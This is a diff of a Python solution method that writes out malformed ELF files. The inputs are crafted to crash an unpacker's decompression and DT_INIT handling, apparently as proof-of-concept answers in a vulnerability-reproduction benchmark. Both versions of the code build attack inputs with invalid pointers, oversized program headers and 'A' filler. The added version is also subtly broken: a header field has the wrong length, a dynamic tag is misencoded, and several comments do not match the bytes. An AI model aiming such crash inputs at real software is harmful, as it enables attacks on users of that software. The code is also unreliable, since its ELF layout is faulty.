@@ -1,88 +1,42 @@
-import struct
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        data = bytearray(512)
-        # ELF header
-        data[0:4] = b'\x7fELF'
-        data[4] = 1  # EI_CLASS
-        data[5] = 1  # EI_DATA
-        data[6] = 1  # EI_VERSION
-        data[7] = 0  # EI_OSABI
-        for i in range(8, 16):
-            data[i] = 0  # EI_PAD
-        struct.pack_into('<H', data, 16, 3)  # e_type ET_DYN
-        struct.pack_into('<H', data, 18, 3)  # e_machine EM_386
-        struct.pack_into('<I', data, 20, 1)  # e_version
-        struct.pack_into('<I', data, 24, 0)  # e_entry
-        struct.pack_into('<I', data, 28, 52)  # e_phoff
-        struct.pack_into('<I', data, 32, 0)  # e_shoff
-        struct.pack_into('<I', data, 36, 0)  # e_flags
-        struct.pack_into('<H', data, 40, 52)  # e_ehsize
-        struct.pack_into('<H', data, 42, 32)  # e_phentsize
-        struct.pack_into('<H', data, 44, 3)  # e_phnum
-        struct.pack_into('<H', data, 46, 0)  # e_shentsize
-        struct.pack_into('<H', data, 48, 0)  # e_shnum
-        struct.pack_into('<H', data, 50, 0)  # e_shstrndx
-        # Program headers start at 52
-        phoff = 52
-        # PT_LOAD text
-        struct.pack_into('<I', data, phoff + 0, 1)  # p_type
-        struct.pack_into('<I', data, phoff + 4, 0)  # p_offset
-        struct.pack_into('<I', data, phoff + 8, 0x400000)  # p_vaddr
-        struct.pack_into('<I', data, phoff + 12, 0x400000)  # p_paddr
-        struct.pack_into('<I', data, phoff + 16, 100)  # p_filesz small
-        struct.pack_into('<I', data, phoff + 20, 0x1000)  # p_memsz large
-        struct.pack_into('<I', data, phoff + 24, 5)  # p_flags RX
-        struct.pack_into('<I', data, phoff + 28, 0x1000)  # p_align
-        phoff += 32
-        # PT_LOAD data
-        struct.pack_into('<I', data, phoff + 0, 1)  # p_type
-        struct.pack_into('<I', data, phoff + 4, 148)  # p_offset
-        struct.pack_into('<I', data, phoff + 8, 0x401000)  # p_vaddr
-        struct.pack_into('<I', data, phoff + 12, 0x401000)  # p_paddr
-        struct.pack_into('<I', data, phoff + 16, 364)  # p_filesz
-        struct.pack_into('<I', data, phoff + 20, 0x2000)  # p_memsz large
-        struct.pack_into('<I', data, phoff + 24, 6)  # p_flags RW
-        struct.pack_into('<I', data, phoff + 28, 0x1000)  # p_align
-        phoff += 32
-        # PT_DYNAMIC
-        dyn_off = 148
-        struct.pack_into('<I', data, phoff + 0, 2)  # p_type
-        struct.pack_into('<I', data, phoff + 4, dyn_off)  # p_offset
-        struct.pack_into('<I', data, phoff + 8, 0x401000)  # p_vaddr
-        struct.pack_into('<I', data, phoff + 12, 0x401000)  # p_paddr
-        struct.pack_into('<I', data, phoff + 16, 64)  # p_filesz
-        struct.pack_into('<I', data, phoff + 20, 64)  # p_memsz
-        struct.pack_into('<I', data, phoff + 24, 4)  # p_flags R
-        struct.pack_into('<I', data, phoff + 28, 8)  # p_align
-        # Dynamic section at 148
-        d_off = 148
-        struct.pack_into('<I', data, d_off, 0)  # DT_NULL
-        struct.pack_into('<I', data, d_off + 4, 0)
-        d_off += 8
-        struct.pack_into('<I', data, d_off, 12)  # DT_INIT
-        struct.pack_into('<I', data, d_off + 4, 0x41414141)  # invalid large ptr
-        d_off += 8
-        struct.pack_into('<I', data, d_off, 5)  # DT_STRTAB
-        struct.pack_into('<I', data, d_off + 4, 0x401100)  # strtab vaddr
-        d_off += 8
-        struct.pack_into('<I', data, d_off, 6)  # DT_SYMTAB
-        struct.pack_into('<I', data, d_off + 4, 0x401200)
-        d_off += 8
-        struct.pack_into('<I', data, d_off, 0)  # DT_NULL
-        struct.pack_into('<I', data, d_off + 4, 0)
-        # Approximate UPX trailer at end
-        trailer_off = 500
-        data[trailer_off] = 0x52  # id
-        data[trailer_off + 1] = 0x03  # cmpr_id
-        data[trailer_off + 2] = 0x0b  # fmt_id ELF
-        data[trailer_off + 3] = 0x14  # method
-        data[trailer_off + 4] = 0  # filter
-        data[trailer_off + 5] = 0
-        data[trailer_off + 6] = 0
-        data[trailer_off + 7] = 0
-        struct.pack_into('<I', data, trailer_off + 8, 512)  # u_len
-        struct.pack_into('<I', data, trailer_off + 12, 0x10000)  # c_len large
-        struct.pack_into('<I', data, trailer_off + 16, 0)  # adc/crc
-        return bytes(data)
+        # Minimal malformed 64-bit ELF shared library header to potentially trigger decompression issues
+        elf_magic = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        elf_type = b'\x03\x00'  # ET_DYN
+        elf_machine = b'\x3e\x00'  # EM_X86_64
+        elf_version = b'\x01\x00\x00\x00'
+        elf_entry = b'\x00\x00\x00\x00\x00\x00\x00\x00'
+        elf_phoff = b'\x40\x00\x00\x00\x00\x00\x00\x00'  # Program headers at 64
+        elf_shoff = b'\x00\x00\x00\x00\x00\x00\x00\x00'  # No section headers
+        elf_flags = b'\x00\x00\x00'
+        elf_ehsize = b'\x40\x00'
+        elf_phentsize = b'\x38\x00'  # 56 bytes per PH
+        elf_phnum = b'\x04\x00'  # 4 program headers to potentially trigger loop issues
+        elf_shentsize = b'\x00\x00'
+        elf_shnum = b'\x00\x00'
+        elf_shstrndx = b'\x00\x00'
+        header = elf_magic + elf_type + elf_machine + elf_version + elf_entry + elf_phoff + elf_shoff + elf_flags + elf_ehsize + elf_phentsize + elf_phnum + elf_shentsize + elf_shnum + elf_shstrndx
+
+        # Program headers: Multiple PT_LOAD with potentially invalid/large sizes and offsets to trigger buffer issues
+        # PH1: PT_LOAD, r-x, offset=0, vaddr=0x400000, filesz=0x1000 (small), memsz=0x1000
+        ph1 = b'\x01\x00\x00\x00' + b'\x05\x00\x00\x00' + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00\x00\x10\x00\x00' + b'\x00\x00\x00\x00\x00\x10\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00'
+        # PH2: PT_LOAD, rw-, offset=0x1000, vaddr=0x401000, filesz=0x100000 (large to cause potential overflow), memsz=0x100000
+        ph2 = b'\x01\x00\x00\x00' + b'\x06\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x10\x00\x00' + b'\x00\x10\x00\x00\x00\x10\x00\x00' + b'\x00\x00\x01\x00\x00\x00\x00\x00' + b'\x00\x00\x01\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00'
+        # PH3: PT_DYNAMIC, to trigger DT_INIT issues, offset=0, vaddr=0x402000, filesz=0x100, memsz=0x100
+        ph3 = b'\x02\x00\x00\x00' + b'\x06\x00\x00\x00' + b'\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00\x20\x00\x00\x00\x10\x00\x00' + b'\x00\x20\x00\x00\x00\x10\x00\x00' + b'\x00\x01\x00\x00\x00\x00\x00\x00' + b'\x00\x01\x00\x00\x00\x00\x00\x00' + b'\x08\x00\x00\x00\x00\x00\x00\x00'
+        # PH4: Another PT_LOAD with invalid method-like flags or large align to trigger unsafe lowmem usage
+        ph4 = b'\x01\x00\x00\x00' + b'\x07\x00\x00\x00' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\x00\x00\x00\x00\x00\x00\x00\x01'  # Invalid offsets/sizes
+
+        phs = ph1 + ph2 + ph3 + ph4  # 4 * 56 = 224 bytes
+
+        # Remaining data: some dynamic tags for DT_INIT, malformed to trigger un_DT_INIT issues
+        dynamic_start = b'\x00\x00\x00\x00'  # DT_NULL
+        dynamic_start += b'\x00\x00\x00\x13' + b'\x20\x40\x00\x00\x00\x00\x00\x00'  # DT_INIT at 0x400020 (invalid)
+        dynamic_start += b'\x00\x00\x00\x00' * 10  # More nulls
+
+        # Pad to 512 bytes total
+        remaining = 512 - len(header + phs + dynamic_start)
+        filler = b'\x41' * remaining  # 'A' pattern for easy crash analysis
+
+        poc = header + phs + dynamic_start + filler
+        return poc
